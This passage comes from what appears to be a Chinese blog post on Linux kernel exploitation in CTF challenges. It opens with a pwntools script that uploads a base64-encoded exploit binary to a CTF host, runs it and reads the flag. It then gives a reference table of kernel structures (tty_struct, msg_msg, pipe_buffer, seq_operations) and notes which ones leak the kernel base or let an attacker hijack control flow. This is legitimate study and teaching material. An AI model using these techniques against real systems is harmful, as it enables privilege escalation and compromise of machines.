class="code"><pre><code class="hljs vim">#!/usr/bin/env <span class="hljs-keyword">python</span><br># coding=utf-<span class="hljs-number">8</span><br>from pwn import *<br>import base64<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>with <span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;./extract/exploit&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> <span class="hljs-keyword">f</span>:<br>    <span class="hljs-built_in">exp</span> = base64.b64encode(<span class="hljs-keyword">f</span>.<span class="hljs-keyword">read</span>())<br><br><span class="hljs-keyword">p</span> = remote(<span class="hljs-string">&quot;node5.anna.nssctf.cn&quot;</span>, <span class="hljs-number">28035</span>)<br>#p = process(<span class="hljs-string">&#x27;./run.sh&#x27;</span>)<br>try_count = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> True:<br>    <span class="hljs-keyword">p</span>.sendline()<br>    <span class="hljs-keyword">p</span>.recvuntil(<span class="hljs-string">&quot;/ $ &quot;</span>)<br><br>    <span class="hljs-built_in">count</span> = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(<span class="hljs-built_in">exp</span>), <span class="hljs-number">0</span>x200):<br>        <span class="hljs-keyword">p</span>.sendline(<span class="hljs-string">&quot;echo -n \&quot;&quot;</span> + <span class="hljs-built_in">exp</span>[i:i + <span class="hljs-number">0</span>x200].decode() + <span class="hljs-string">&quot;\&quot; &gt;&gt; /tmp/b64_exp&quot;</span>)<br>        <span class="hljs-built_in">count</span> += <span class="hljs-number">1</span><br>        <span class="hljs-built_in">log</span>.info(<span class="hljs-string">&quot;count: &quot;</span> + str(<span class="hljs-built_in">count</span>))<br><br>    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">count</span>):<br>        <span class="hljs-keyword">p</span>.recvuntil(<span class="hljs-string">&quot;/ $ &quot;</span>)<br><br>    <span class="hljs-keyword">p</span>.sendline(<span class="hljs-string">&quot;cat /tmp/b64_exp | base64 -d &gt; /tmp/exploit&quot;</span>)<br>    <span class="hljs-keyword">p</span>.sendline(<span class="hljs-string">&quot;chmod +x /tmp/exploit&quot;</span>)<br>    <span class="hljs-keyword">p</span>.sendline(<span class="hljs-string">&quot;/tmp/exploit &quot;</span>)<br>    <span class="hljs-keyword">p</span>.sendline(<span class="hljs-string">&quot;cat /flag&quot;</span>)<br>    <span class="hljs-keyword">print</span>(<span class="hljs-keyword">p</span>.recvline())<br>    <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">p</span>.interactive()<br></code></pre></td></tr></table></figure><h1 id="0x06-有用的一些结构体"><a href="#0x06-有用的一些结构体" class="headerlink" title="0x06 有用的一些结构体"></a>0x06 有用的一些结构体</h1><table><thead><tr><th>结构体名称</th><th>大小</th><th>分配标志</th><th>基地址</th><th>堆地址</th><th>执行流</th></tr></thead><tbody><tr><td>cred</td><td>kmalloc-192(0x80)</td><td></td><td>:thumbsup:</td><td>:x:</td><td>:x:</td></tr><tr><td>tty_struct</td><td>kmalloc-1k(0x2e0)</td><td>GFP_KERNEL_ACCOUNT</td><td>:thumbsup:</td><td>:x:</td><td>:thumbsup:</td></tr><tr><td>user_key_payload</td><td>kmalloc-*(0x18 head)</td><td>GFP_KERNEL</td><td>:thumbsup:</td><td>:thumbsup:</td><td>:x:</td></tr><tr><td>pipe_inode_info</td><td>kmalloc-192</td><td>GFP_KERNEL_ACCOUNT|__GFP_ZERO</td><td>:thumbsup:</td><td>:thumbsup:</td><td>:thumbsup:</td></tr><tr><td>pipe_buffer</td><td>kmalloc-1k(0x28 * 16，可修改)</td><td>GFP_KERNEL_ACCOUNT</td><td>:thumbsup:</td><td>:thumbsup:</td><td>:thumbsup:</td></tr><tr><td>msg_msg</td><td>kmalloc-*(&lt;&#x3D;4k,0x30 head)</td><td>GFP_KERNEL_ACCOUNT</td><td>:x:</td><td>:thumbsup:</td><td>:x:</td></tr><tr><td>msg_msgseg</td><td>kmalloc-*(&lt;&#x3D; 4k, 0x8 head)</td><td>GFP_KERNEL_ACCOUNT</td><td>:x:</td><td>:thumbsup:</td><td>:x:</td></tr><tr><td>seq_operation</td><td>kmalloc-32</td><td>GFP_KERNEL_ACCOUNT</td><td>:thumbsup:</td><td>:x:</td><td>:thumbsup:</td></tr><tr><td>setxattr</td><td>kmalloc-*</td><td>GFP_KERNEL</td><td>:x:</td><td>:x:</td><td>:x:</td></tr><tr><td>sk_buff</td><td>kmalloc-*(&gt;&#x3D;512, 320 tail)</td><td></td><td>:x:</td><td>:x:</td><td>:x:</td></tr></tbody></table><h2 id="seq-operations"><a href="#seq-operations" class="headerlink" title="seq_operations"></a>seq_operations</h2><ul><li>大小：0x20</li><li>open(“&#x2F;proc&#x2F;self&#x2F;stat”)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> &#123;</span><br><span class="hljs-type">void</span> * (*start) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *pos);<br><span class="hljs-type">void</span> (*stop) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br><span class="hljs-type">void</span> * (*next) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos);<br><span class="hljs-type">int</span> (*show) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>&#125;;<br></code></pre></td></tr></table></figure><p>当我们在读取打开的 <code>/proc/self/stat</code>文件时，会默认调用 <code>seq_operations-&gt;start</code>指针指向的函数，默认为内核中的函数 <code>single_start</code></p><h2 id="tty-struct"><a href="#tty-struct" class="headerlink" title="tty_struct"></a>tty_struct</h2><ul><li>大小：0x2e0</li><li>open(“&#x2F;dev&#x2F;ptmx”)-&gt;alloc_tty_struct()-&gt;get tty_struct</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> &#123;</span><br><span class="hljs-type">int</span>magic;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kref</span> <span class="hljs-title">kref</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> *<span class="hljs-title">dev</span>;</span><span class="hljs-comment">/* class device or NULL (e.g. ptys, serdev) */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span> *<span class="hljs-title">driver</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">int</span> index;<br><br><span class="hljs-comment">/* Protects ldisc changes: Lock tty not pty */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ld_semaphore</span> <span class="hljs-title">ldisc_sem</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_ldisc</span> *<span class="hljs-title">ldisc</span>;</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">atomic_write_lock</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">legacy_mutex</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">throttle_mutex</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rw_semaphore</span> <span class="hljs-title">termios_rwsem</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">winsize_mutex</span>;</span><br><span class="hljs-comment">/* Termios values are protected by the termios rwsem */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ktermios</span> <span class="hljs-title">termios</span>, <span class="hljs-title">termios_locked</span>;</span><br><span class="hljs-type">char</span> name[<span class="hljs-number">64</span>];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><span class="hljs-type">int</span> count;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">winsize</span> <span class="hljs-title">winsize</span>;</span><span class="hljs-comment">/* winsize_mutex */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">spinlock_t</span> lock;<br><span class="hljs-type">bool</span> stopped;<br><span class="hljs-type">bool</span> tco_stopped;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> unused[<span class="hljs-number">0</span>];<br>&#125; __aligned(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)) flow;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">spinlock_t</span> lock;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">pgrp</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">session</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> pktstatus;<br><span class="hljs-type">bool</span> packet;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> unused[<span class="hljs-number">0</span>];<br>&#125; __aligned(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)) ctrl;<br><br><span class="hljs-type">int</span> hw_stopped;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> receive_room;<span class="hljs-comment">/* Bytes free for queue */</span><br><span class="hljs-type">int</span> flow_change;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> *<span class="hljs-title">link</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync</span>;</span><br><span class="hljs-type">wait_queue_head_t</span> write_wait;<br><span class="hljs-type">wait_queue_head_t</span> read_wait;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_struct</span> <span class="hljs-title">hangup_work</span>;</span><br><span class="hljs-type">void</span> *disc_data;<br><span class="hljs-type">void</span> *driver_data;<br><span class="hljs-type">spinlock_t</span> files_lock;<span class="hljs-comment">/* protects tty_files list */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">tty_files</span>;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N_TTY_BUF_SIZE 4096</span><br><br><span class="hljs-type">int</span> closing;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *write_buf;<br><span class="hljs-type">int</span> write_cnt;<br><span class="hljs-comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_struct</span> <span class="hljs-title">SAK_work</span>;</span> <span class="hljs-comment">//这里存在一个函数指针,可以泄露基地址</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_port</span> *<span class="hljs-title">port</span>;</span><br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><p>其中又包括了<code>tty_operations</code>,因此我么可以劫持该函数流来执行我们的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> * (*<span class="hljs-title">lookup</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span> *<span class="hljs-title">driver</span>,</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span>, <span class="hljs-title">int</span> <span class="hljs-title">idx</span>);</span><br><span class="hljs-type">int</span>  (*install)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">void</span> (*remove)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">int</span>  (*open)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br><span class="hljs-type">void</span> (*close)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br><span class="hljs-type">void</span> (*shutdown)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">void</span> (*cleanup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">int</span>  (*write)(<span class="hljs-keyword">struct</span> tty_struct * tty,<br>      <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">int</span> count);<br><span class="hljs-type">int</span>  (*put_char)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> ch);<br><span class="hljs-type">void</span> (*flush_chars)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">unsigned</span> <span class="hljs-title function_">int</span> <span class="hljs-params">(*write_room)</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tty_struct *tty)</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-title function_">int</span> <span class="hljs-params">(*chars_in_buffer)</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tty_struct *tty)</span>;<br><span class="hljs-type">int</span>  (*ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br><span class="hljs-type">long</span> (*compat_ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br><span class="hljs-type">void</span> (*set_termios)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> ktermios * old);<br><span class="hljs-type">void</span> (*throttle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br><span class="hljs-type">void</span> (*unthrottle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br><span class="hljs-type">void</span> (*stop)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">void</span> (*start)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">void</span> (*hangup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">int</span> (*break_ctl)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> state);<br><span class="hljs-type">void</span> (*flush_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">void</span> (*set_ldisc)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">void</span> (*wait_until_sent)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> timeout);<br><span class="hljs-type">void</span> (*send_xchar)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">char</span> ch);<br><span class="hljs-type">int</span> (*tiocmget)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">int</span> (*tiocmset)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-built_in">set</span>, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> clear);<br><span class="hljs-type">int</span> (*resize)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> winsize *ws);<br><span class="hljs-type">int</span> (*get_icount)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br><span class="hljs-keyword">struct</span> serial_icounter_struct *icount);<br><span class="hljs-type">int</span>  (*get_serial)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> serial_struct *p);<br><span class="hljs-type">int</span>  (*set_serial)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> serial_struct *p);<br><span class="hljs-type">void</span> (*show_fdinfo)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> seq_file *m);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span><br><span class="hljs-type">int</span> (*poll_init)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> *options);<br><span class="hljs-type">int</span> (*poll_get_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line);<br><span class="hljs-type">void</span> (*poll_put_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> ch);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">int</span> (*proc_show)(<span class="hljs-keyword">struct</span> seq_file *, <span class="hljs-type">void</span> *);<br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><p>他可以用来泄露内核基地址，其偏移<strong>0x2d0</strong>的地方，存在<code>do_SAK_work</code>函数指针</p><h2 id="msg-msg"><a href="#msg-msg" class="headerlink" title="msg_msg"></a>msg_msg</h2><ul><li>大小：&lt;1k</li><li>sendmsg</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span> <span class="hljs-comment">/* 用作与其他msg_msg相链接 */</span><br><span class="hljs-type">long</span> m_type; <span class="hljs-comment">/* 消息类型，用于支持前文所描述的消息队列当中不同的消息类型 */</span><br><span class="hljs-type">size_t</span> m_ts;<span class="hljs-comment">/* 消息正文长度 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span>  <span class="hljs-comment">/* 如果保存超过一个内存页的长消息，则需要next */</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-comment">/* 接下来是实际的消息 */</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-comment">/* 接下来是实际的消息 */</span><br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="pipe-inode-info"><a href="#pipe-inode-info" class="headerlink" title="pipe_inode_info"></a>pipe_inode_info</h2><ul><li><p>大小：192</p></li><li><p>pipe(pipe_fd)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">mutex</span>;</span><br><span class="hljs-type">wait_queue_head_t</span> rd_wait, wr_wait;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tail;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_usage;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ring_size;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-type">bool</span> note_loss;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_accounted;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> readers;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> writers;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> files;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> r_counter;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> w_counter;<br><span class="hljs-type">bool</span> poll_usage;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">tmp_page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_readers</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_writers</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span> <span class="hljs-comment">//存放pipe_buffer数组</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_queue</span> *<span class="hljs-title">watch_queue</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure></li></ul><h2 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h2><ul><li>大小：1k(默认，可通过fcntl进行修改)</li><li>write(pipe_fd[1], …)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *@page: the page containing the data for the pipe buffer</span><br><span class="hljs-comment"> *@offset: offset of data inside the @page</span><br><span class="hljs-comment"> *@len: length of data inside the @page</span><br><span class="hljs-comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span><br><span class="hljs-comment"> *@flags: pipe buffer flags. See above.</span><br><span class="hljs-comment"> *@private: private data owned by the ops.</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="sk-buff"><a href="#sk-buff" class="headerlink" title="sk_buff"></a>sk_buff</h2><ul><li>大小：&gt;512</li><li>通过socketpair收发包</li></ul><h2 id="setxattr"><a href="#setxattr" class="headerlink" title="setxattr"></a>setxattr</h2><ul><li>大小：</li></ul><p>调用链</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">setxattr(userland)<br>path_setxattr<br><span class="hljs-title function_">setxattr</span><span class="hljs-params">(kernel)</span><br></code></pre></td></tr></table></figure><p>下面是涉及到的核心函数setxattr</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Extended attribute SET operations</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">long</span></span><br><span class="hljs-function"><span class="hljs-title">setxattr</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> user_namespace *mnt_userns, <span class="hljs-keyword">struct</span> dentry *d,</span></span><br><span class="hljs-params"><span class="hljs-function"> <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *name, <span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *value, <span class="hljs-type">size_t</span> size,</span></span><br><span class="hljs-params"><span class="hljs-function"> <span class="hljs-type">int</span> flags)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> error;<br><span class="hljs-type">void</span> *kvalue = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">char</span> kname[XATTR_NAME_MAX + <span class="hljs-number">1</span>];<br><br>...<br><br><span class="hljs-keyword">if</span> (size) &#123;<br><span class="hljs-keyword">if</span> (size &gt; XATTR_SIZE_MAX)<br><span class="hljs-keyword">return</span> -E2BIG;<br>kvalue = <span class="hljs-built_in">kvmalloc</span>(size, GFP_KERNEL);<br><span 